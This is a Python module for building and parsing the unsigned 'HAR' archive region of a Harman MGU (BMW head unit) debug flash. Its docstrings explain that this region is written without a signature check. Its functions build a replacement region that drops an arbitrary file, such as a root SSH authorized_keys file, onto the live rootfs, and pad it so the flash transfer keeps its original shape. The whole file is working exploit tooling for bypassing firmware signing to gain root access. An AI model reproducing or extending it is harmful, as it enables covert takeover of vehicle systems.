"""Harman MGU "HAR" archive builder/parser.

The MGU debug flash writes two kinds of regions over ENET:

* the signed SWE 000056ea (header at 0x041000 carries a BMW RSA-2048 signature;
  manifest at 0x108000; file data at 0xf08000) - we cannot modify this, the
  signature is BMW's and not reproducible; and
* a SECOND region at 0xf0a000 that installs /etc/ssl/certs/debugCA.pem onto the
  live rootfs. That region is a plain ``HAR#$%&@`` archive whose 16-byte header
  hash field is ZEROED and which is NOT referenced by the signed manifest - i.e.
  it is written and applied WITHOUT a signature. (Verified by decoding the real
  images; this module's round-trip test reconstructs that region byte-for-byte.)

So an arbitrary file can be dropped onto the rootfs by building another such
unsigned HAR region (e.g. /usr/share/sshd/authorized_keys.root) - no BMW
signature needed. This module builds and parses that format.

Layout (all little-endian):
  header  : 'HAR#$%&@' + ea560000 + feff0000 + 01000000 + 00030500 + 16 zero
            bytes (hash, left zero = unsigned) + 24 zero bytes          (64 B)
  entry   : 92-byte record + path bytes + 28-byte zero trailer
  record  : u32[23] - [0]=0x12500000 marker, [1]=path length,
            [3]=compressed size, [4]=uncompressed size,
            [5]=type (0x8501 dir / 0x7401 file), [6]=0x53,
            [9]/[11]/[13]=mtime (atime/ctime/mtime), [15]=mode
            (0x41ed dir 0o40755 / 0x81a4 file 0o100644), [17]=nlink
            (2 dir / 1 file), [20]=size (file only), [21]=0x1000 (block)
  content : each file's zlib stream, concatenated in entry order, after the
            last entry.
"""

import struct
import zlib

MAGIC = b'HAR#$%&@'
HEADER = MAGIC + bytes.fromhex('ea560000feff00000100000000030500') + b'\x00' * 16 + b'\x00' * 24
DIR_MODE = 0o40755
FILE_MODE = 0o100644
_MARKER = 0x12500000
_CONST = 0x53
_BLOCK = 0x1000


class HarFile:
    __slots__ = ('path', 'is_dir', 'data', 'mode', 'mtime')

    def __init__(self, path, is_dir=False, data=b'', mode=None, mtime=0):
        self.path = path
        self.is_dir = is_dir
        self.data = data or b''
        self.mode = mode if mode is not None else (DIR_MODE if is_dir else FILE_MODE)
        self.mtime = mtime


def _record(path_len, comp, uncomp, is_dir, mode, mtime):
    w = [0] * 23
    w[0] = _MARKER
    w[1] = path_len
    w[3] = comp
    w[4] = uncomp
    w[5] = 0x8501 if is_dir else 0x7401
    w[6] = _CONST
    w[9] = w[11] = w[13] = mtime & 0xFFFFFFFF
    w[15] = mode
    w[17] = 2 if is_dir else 1
    w[20] = 0 if is_dir else uncomp
    w[21] = _BLOCK
    return struct.pack('<23I', *w)


def build_region(files, zblobs=None):
    """Build an unsigned HAR region from a list of HarFile.

    *files* must include every parent directory entry before the file that needs
    it (e.g. /usr, /usr/share, /usr/share/sshd, then the file), matching how the
    debugCA region lists /etc, /etc/ssl, /etc/ssl/certs then the cert.

    *zblobs* optionally maps a file path to a pre-made zlib stream (used by the
    round-trip test to reproduce an original byte-for-byte); otherwise each
    file's data is compressed with zlib level 9.
    """
    zblobs = zblobs or {}
    records = bytearray()
    contents = bytearray()
    for f in files:
        p = f.path.encode('utf-8')
        if f.is_dir:
            comp = uncomp = 0
            cdata = b''
        else:
            cdata = zblobs.get(f.path) or zlib.compress(f.data, 9)
            comp = len(cdata)
            uncomp = len(f.data)
        records += _record(len(p), comp, uncomp, f.is_dir, f.mode, f.mtime)
        records += p + b'\x00' * 28
        contents += cdata
    return HEADER + bytes(records) + bytes(contents)


def dirs_for(path, mtime=0):
    """Return HarFile dir entries for every parent of *path* (absolute),
    in order, so build_region has the directory chain the archive expects."""
    out = []
    parts = [p for p in path.split('/') if p]
    for i in range(1, len(parts)):
        out.append(HarFile('/' + '/'.join(parts[:i]), is_dir=True, mtime=mtime))
    return out


def file_region(path, data, mode=FILE_MODE, mtime=0):
    """Convenience: build a region that installs a single file at *path*
    (absolute), creating its parent-directory chain. Returns the region bytes."""
    files = dirs_for(path, mtime) + [HarFile(path, data=data, mode=mode, mtime=mtime)]
    return build_region(files)


def _walk_records(blob):
    """Yield (path, comp, typ, mtime) for each record in *blob*, in order."""
    off = len(HEADER)
    while off + 92 <= len(blob) and struct.unpack_from('<I', blob, off)[0] == _MARKER:
        w = struct.unpack_from('<23I', blob, off)
        plen, comp, typ, mtime = w[1], w[3], w[5], w[13]
        path = blob[off + 92: off + 92 + plen].decode('utf-8')
        yield path, comp, typ, mtime
        off += 92 + plen + 28


def replace_region_with_file(region, path, data, mode=FILE_MODE, mtime=None,
                             pad_to=None):
    """Return a new unsigned HAR region that installs ONLY *path*/*data* (plus its
    parent-directory chain), replacing whatever the original *region* carried.

    The debug flash writes one unsigned HAR region (the real image's holds just
    /etc/ssl/certs/debugCA.pem). This swaps that single unchecked file for our own
    (e.g. /usr/share/sshd/authorized_keys.root), so the flash drops our key in the
    one slot that is not covered by the BMW signature.

    By default the result is zero-padded to the original region's byte length
    (*pad_to*), so the region keeps the exact same size the flash already sends -
    the RequestDownload size byte and the TransferData block lengths stay
    identical, and only the content bytes differ. The HAR parser reads each entry
    by its stored size and stops, so the trailing zero padding is ignored. New
    entries reuse the original region's newest mtime so the archive stays
    internally consistent."""
    if region[:8] != MAGIC:
        raise ValueError('not a HAR region')
    if pad_to is None:
        pad_to = len(region)
    if mtime is None:
        mts = [mt for _p, _c, _t, mt in _walk_records(region)]
        mtime = max(mts) if mts else 0
    files = dirs_for(path, mtime) + [HarFile(path, data=data, mode=mode, mtime=mtime)]
    blob = build_region(files)
    if len(blob) > pad_to:
        raise ValueError('replacement region (%d B) exceeds the original (%d B); '
                         'cannot preserve the transfer shape' % (len(blob), pad_to))
    return blob + b'\x00' * (pad_to - len(blob))


def parse_region(blob):
    """Parse a HAR region into a list of (path, is_dir, mode, data). Mirrors
    build_region; used by the self-test."""
    if blob[:8] != MAGIC:
        raise ValueError('not a HAR region')
    off = len(HEADER)
    entries = []
    content_specs = []
    # Walk records until the marker no longer appears (then content begins).
    while off + 92 <= len(blob) and struct.unpack_from('<I', blob, off)[0] == _MARKER:
        w = struct.unpack_from('<23I', blob, off)
        plen, comp, uncomp, typ, mode = w[1], w[3], w[4], w[5], w[15]
        path = blob[off + 92: off + 92 + plen].decode('utf-8')
        is_dir = (typ == 0x8501)
        entries.append([path, is_dir, mode, b''])
        if not is_dir:
            content_specs.append((len(entries) - 1, comp, uncomp))
        off += 92 + plen + 28
    cpos = off
    for idx, comp, uncomp in content_specs:
        data = zlib.decompress(blob[cpos: cpos + comp])
        entries[idx][3] = data
        cpos += comp
    return [tuple(e) for e in entries]
